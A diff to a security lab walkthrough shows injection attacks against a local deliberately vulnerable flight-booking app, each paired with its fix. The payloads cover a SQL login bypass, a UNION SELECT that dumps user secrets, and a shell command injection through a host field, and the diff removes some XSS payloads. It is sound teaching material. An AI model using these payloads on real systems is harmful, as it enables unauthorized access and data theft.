@@ -4,7 +4,7 @@
 
 Try the lab yourself first, using the hints from the [README](./README.md).
 
-All requests below are against vulnerable (port 8041).
+All requests below are against vulnerable (port 8041). In a browser, the payloads go into the same fields — the site and `/ui` show identical results.
 
 ## 1. Login bypass
 
@@ -26,73 +26,78 @@ curl -H 'Content-Type: application/json' \
 # → logged in as admin and FLAG{a05_sqli_login_bypass}
 ```
 
-Another option: the login `nobody' OR '1'='1' --`, the condition becomes always true, and you are logged in as the first user in the table.
+The same flag is returned by `GET /me` while you are signed in as admin (open `/admin` in the browser).
 
-## 2. The hidden product
+Another option: the login `nobody' OR '1'='1' --` — the condition becomes always true and you are signed in as the first user in the table.
 
-```sql
-SELECT id, name, price FROM products WHERE name LIKE '%<q>%' AND hidden = 0
-```
+## 2. The hidden charter flight
+
+The search query contains `AND hidden = 0`. A quote with `OR 1=1` makes the condition always true, and `--` throws the rest away:
 
 ```bash
-curl -G http://127.0.0.1:8041/products --data-urlencode "q=%' OR 1=1 --"
-# the hidden product with FLAG{a05_hidden_product} appears in the response
+curl -G http://127.0.0.1:8041/flights \
+  --data-urlencode "from=" --data-urlencode "to=%' OR 1=1 --"
+# → among the usual flights: "SK 900" — the charter
 ```
 
-`OR 1=1` makes the condition true, and `--` throws away `AND hidden = 0`.
+Open it: `GET /flight/6` — the note field contains `FLAG{a05_hidden_flight}`.
+
+Try `to='` alone: the page returns the SQL error text (`unrecognized token`). Such errors help an attacker understand the structure of the query, so they must never be shown to the user. Another example: `max_price=abc` → `no such column: abc`.
 
 ## 3. UNION: data from another table
 
-The original query returns three columns (`id`, `name`, `price`), so `UNION SELECT` must have three too:
+The search returns 7 columns (`id, flight_no, origin, destination, dep_date, dep_time, price`), so `UNION SELECT` must return exactly 7 too:
 
 ```bash
-curl -G http://127.0.0.1:8041/products \
-  --data-urlencode "q=' UNION SELECT id, username, secret FROM users --"
-# the name field holds admin, and the price field holds FLAG{a05_sqli_union_dump}
+curl -G http://127.0.0.1:8041/flights --data-urlencode "from=" \
+  --data-urlencode "to=' UNION SELECT id,username,'X',secret,'2026-11-14','00:00',0 FROM users --"
+# → flight_no holds the username, destination holds the secret:
+#   admin -> FLAG{a05_sqli_union_dump}
 ```
 
-Try `q='` with nothing after it: the application returns the SQL error text. Such errors help an attacker understand the structure of the query, so they must not be shown to the user.
+In the browser the fake "flights" show up in the same list: `admin → FLAG{...}`.
 
-## 4. XSS
+## 4. Command injection in the node check
 
-**Reflected.** The script arrives in a parameter and goes straight into the page. Open in a browser:
-
-```
-http://127.0.0.1:8041/search?q=<script>alert(1)</script>
-```
-
-**Stored.** The script is saved on the server and runs for everyone who opens the page:
+First get an admin session (step 1), then send a host with a shell separator:
 
 ```bash
-curl -H 'Content-Type: application/json' \
-  -d '{"name":"x","message":"<script>alert(1)</script>"}' http://127.0.0.1:8041/guestbook
+curl -s -c jar.txt -H 'Content-Type: application/json' \
+  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8041/login
+curl -s -b jar.txt -H 'Content-Type: application/json' \
+  -d '{"host":"localhost; echo $A05_FLAG"}' http://127.0.0.1:8041/admin/check
+# → {"output":"FLAG{a05_command_injection}\n"}
 ```
 
-Then open http://127.0.0.1:8041/guestbook in a browser. In a real system, instead of `alert(1)` there could be code that steals the user's data, which is why XSS is dangerous.
-
-The guestbook is kept in the application's memory and is cleared on restart.
+The application runs `ping -c 1 <host>` through `os.popen`, i.e. through a shell, so `;` starts a second command — and the flag lives in the process environment (`A05_FLAG`), which the shell sees. On Windows the separator is `&` and the variable is written `%A05_FLAG%`. In a browser: `/admin` → «Airport node check» → host `localhost; echo $A05_FLAG`.
 
 ## Fixes (fixed, port 8042)
 
 | Problem | Fix |
 |---------|-----|
-| String concatenation in SQL (login, search) | Parameterized queries: `... WHERE username = ?`, `... LIKE ?` |
-| Output without escaping (search, guestbook) | `markupsafe.escape` on output: `<` becomes `&lt;` |
-| No defense in depth | The header `Content-Security-Policy: default-src 'none'` forbids running scripts, field lengths are limited |
-| Password compared inside SQL | The password is compared in code with `hmac.compare_digest` |
-| Database error text in the response | The SQL error no longer occurs, and the queries do not depend on the input |
+| String concatenation in SQL (login, search) | Parameterized queries: `... WHERE username = ?`, `origin LIKE ?`; values are limited by length and format |
+| `hidden = 0` neutralized by `OR 1=1` | The condition and the values live in different parts of the query — the data cannot change the structure |
+| Database error text in the response | The SQL error no longer occurs, and the message shown is generic |
+| A command string built from user input | No shell at all: the host must match `^[A-Za-z0-9.-]+$` and is resolved by `socket.gethostbyname` |
+| The flag in the process environment | The fixed version does not put secrets into the environment |
 
 Check on fixed (port 8042):
 
 ```bash
 curl -H 'Content-Type: application/json' \
-  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8042/login         # 401
-curl -G http://127.0.0.1:8042/products --data-urlencode "q=' UNION SELECT id, username, secret FROM users --"   # []
-curl "http://127.0.0.1:8042/search?q=<script>alert(1)</script>"   # the response contains &lt;script&gt;...
+  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8042/login        # 401
+curl -G http://127.0.0.1:8042/flights --data-urlencode "from=" \
+  --data-urlencode "to=' UNION SELECT id,username,'X',secret,'2026-11-14','00:00',0 FROM users --"
+# → 0 rows: the payload is searched for as an ordinary string
+curl -s -c jar.txt -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":"Adm1n-lab-pass"}' http://127.0.0.1:8042/login
+curl -s -b jar.txt -H 'Content-Type: application/json' \
+  -d '{"host":"localhost; echo $A05_FLAG"}' http://127.0.0.1:8042/admin/check
+# → invalid host: 'localhost; echo $A05_FLAG' (allowed: letters, digits, dot, dash)
 ```
 
 ## What else to remember
-- Escaping depends on the context (HTML, attribute, JavaScript, URL), so it is better to use a template engine with auto-escaping.
-- Parameterization protects values, but not table and column names: they must not be taken from input, only from an allow list.
-- Injections are not limited to SQL and HTML: OS commands, LDAP, NoSQL queries. The principle is the same everywhere: data must not be mixed with code.
-- Passwords in this lab are stored in plain text only for simplicity. For password storage see lab A04.
+- Parameterization protects values, but not table and column names: they must never come from input, only from an allowlist.
+- Injection is not limited to SQL: commands of the OS, LDAP, NoSQL queries, log entries. The principle is always the same: data must not be mixed with code.
+- Input validation is a whitelist, not a blacklist: "no semicolons" loses to `$IFS`, newlines and dozens of other tricks.
+- The login bypass worked because the password was checked *inside* SQL. Compare secrets in the application code (see lab A04 for how to store them).
